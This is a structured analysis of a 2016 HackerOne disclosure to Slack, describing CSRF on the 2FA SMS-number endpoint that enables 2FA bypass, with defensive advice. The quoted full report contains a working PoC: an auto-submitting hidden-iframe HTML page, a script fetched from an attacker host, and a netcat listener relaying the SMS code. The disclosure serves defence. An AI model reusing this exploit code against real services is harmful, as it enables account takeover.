# CSRF - Add Optional Two Factor Mobile Number

## Metadata
- **Source:** HackerOne
- **Report:** 155774 | https://hackerone.com/reports/155774
- **Submitted:** 2016-08-01
- **Reporter:** nhavis
- **Program:** Slack
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Cross-Site Request Forgery (CSRF), Missing CSRF Token Validation, Two-Factor Authentication Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
The 2FA SMS setup endpoint at /account/settings/2fa_sms fails to validate CSRF tokens, allowing attackers to force authenticated users to register attacker-controlled phone numbers for two-factor authentication. Once registered, attackers can intercept SMS codes and fully bypass 2FA to gain account access, even when the target's password is known or compromised.

## Attack scenario
1. Attacker crafts malicious HTML page containing hidden forms and JavaScript that targets the vulnerable /account/settings/2fa_sms endpoint
2. Attacker sends link to logged-in Slack user (via phishing, malicious site, etc.); victim clicks link while authenticated to Slack
3. Victim's browser automatically submits POST request to add attacker's phone number as secondary 2FA method, bypassing CSRF protection due to missing/unvalidated crumb token
4. Attacker receives SMS code intended for victim and sends it back via JavaScript to victim's browser for automatic verification
5. Attacker's phone number is now registered as valid 2FA method on victim's account
6. Attacker logs in with known/compromised password and requests verification code be sent to their registered phone number, completely bypassing 2FA

## Root cause
The server does not properly validate the existence or value of the 'crumb' CSRF token parameter in requests to /account/settings/2fa_sms. The endpoint accepts state-changing operations without verifying the request originated from legitimate user action, allowing arbitrary POST requests from external origins to execute with the victim's privileges.

## Attacker mindset
Attacker recognizes that 2FA is a critical security control and targets its configuration rather than the authentication mechanism itself. Attack leverages the implicit trust users place in being logged in, automating the bypass through JavaScript to minimize user interaction required. Attacker has either obtained credentials or has privileged access (admin reset capability) and seeks to maintain persistence by registering their own phone number as the primary 2FA contact.

## Defensive takeaways
- Implement and validate CSRF tokens (crumb/nonce) on ALL state-changing operations, especially security-sensitive features like 2FA configuration
- Use SameSite cookie attributes (Strict or Lax) to prevent automatic cookie transmission in cross-site requests
- Require step-up authentication (re-authentication) when modifying critical security settings like 2FA phone numbers
- Implement rate limiting and anomaly detection on 2FA configuration changes
- Send notifications to user's email/existing 2FA method when new 2FA devices are registered
- Enforce verification of new phone numbers through secure out-of-band channels before activation
- Log and audit all 2FA configuration changes with detailed metadata for forensic analysis
- Consider requiring explicit user confirmation dialog with security warnings when adding new 2FA methods

## Variant hunting
Check other 2FA configuration endpoints (/account/settings/2fa_app, /account/settings/backup_codes, etc.) for similar CSRF vulnerabilities
Test email/phone number change endpoints for CSRF protection - these often control password reset vectors
Examine API endpoints that modify account security settings for missing token validation
Review payment method addition/change endpoints which may bypass CSRF checks
Test password change endpoint for CSRF - if unprotected, attackers could lock out legitimate users
Check social engineering vectors like trusted device registration or IP whitelist changes
Test for CSRF on email/SMS notification preference changes that could silence security alerts

## MITRE ATT&CK
- T1190
- T1566
- T1598
- T1556
- T1491
- T1539

## Notes
This report demonstrates a critical authentication bypass chain: CSRF vulnerability → 2FA configuration manipulation → 2FA bypass → Account compromise. The attacker's complete PoC using hidden iframes and JavaScript shows production-ready exploitation capability. The vulnerability is particularly severe because it affects accounts that already have strong credentials/2FA enabled. The attack surface includes any compromised password holder or privileged insider with email access. Fix should be prioritized as critical due to direct impact on account takeover with minimal attacker effort required.

## Full report
<details><summary>Expand</summary>

Description
====================
Adding a mobile number for 2-factor authentication is vulnerable to CSRF, allowing an attacker to bypass 2-factor authentication. An attacker would be able to force the logged in user to add a new mobile number for 2-factor authentication. The attacker would then receive the SMS code and automatically make the victim verify it (in Javascript). When the attacker attempts to login to the victim's account, the verification code can then be sent to the attacker's mobile number. 

An attacker could be anyone trying to bypass 2-factor authentication, for example:
1. Anyone who already has the password to an account.
2. A company's IT administrator who has access to the user's e-mail and can reset the password.

I have provided a complete Proof of Concept without the **crumb** parameter, which I have manually verified myself.

Vulnerable URL:
====================
* /account/settings/2fa_sms

Root cause:
====================
Server does not validate the existence or value of the **crumb** parameter containing the CSRF token.

Sample vulnerable request:
====================
```
POST /account/settings/2fa_sms HTTP/1.1
Host: cs-sa.slack.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: REDACTED=REDACTED
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

verify_two_factor=1&backup=&app=&primary_phone_number=%2B61+0████████&country_code=AU&phone_number=█████████
```

Attack flow:
====================
1. Attacker sends logged in slack user a link and slack user clicks it.
2. The link contains HTML and Javascript code that forces the victim in to adding a new 2-factor mobile number (**slackcsrf.html** provided below). The code does not contain the **crumb** parameter.
3. The code also connects back to the attacker's machine waiting for the attacker to enter the code so it can be used for verification (within seconds and potentially automatically).
4. The attacker receives the code via SMS and sends it back to the victim. (**Attacker web server** provided below)
5. The HTML code forces the victim to verify the new mobile number.
6. The mobile number has now been added to the victim's account for 2FA.
7. The attacker logs in and bypasses 2FA by requesting the code with the secondary mobile number.

slackcsrf.html:
---------------------
```
<html>
<body>
<IFRAME style="display:none" name="hidden-form"></iframe>
    <form action="https://cs-sa.slack.com/account/settings/2fa_sms" method="POST" target="hidden-form" name="pocframe">
      <input type="hidden" name="verify&#95;two&#95;factor" value="1" />
      <input type="hidden" name="backup" value="" />
      <input type="hidden" name="app" value="" />
      <input type="hidden" name="country&#95;code" value="AU" />
      <input type="hidden" name="phone&#95;number" value="█████████" />
    </form>
<script>document.pocframe.submit();</script>

<script src="http://192.168.1.82:8080/a"></script>
<IFRAME style="display:none" name="hidden-form2"></iframe>
    <form action="https://cs-sa.slack.com/account/settings/2fa_sms" method="POST" target="hidden-form2" name="pocframe2">
      <input type="hidden" name="verify&#95;two&#95;factor" value="1" />
      <input type="hidden" name="backup" value="1" />
      <input type="hidden" name="app" value="" />
      <input type="hidden" name="formatted&#95;phone&#95;number" value="&#43;61&#32;████████" />
      <input type="hidden" name="country&#95;code" value="AU" />
      <input type="hidden" id="scode" name="confirmation&#95;code" value="" />
    </form>
<script>
	document.getElementById("scode").value = scode;
	document.pocframe2.submit();
</script>
</body>
</html>
```

Attacker web server:
---------------------
```
root@foxtrotter:/var/www/html# nc -nlvp 8080
listening on [any] 8080 ...
connect to [192.168.1.82] from (UNKNOWN) [192.168.1.81] 56194
GET /a HTTP/1.1
Host: 192.168.1.82:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.82/slackcsrf.html
Connection: close
Cache-Control: max-age=0

HTTP/1.1 200 OK

scode=196206;
```


</details>

---
*Analysed by Claude on 2026-05-24*
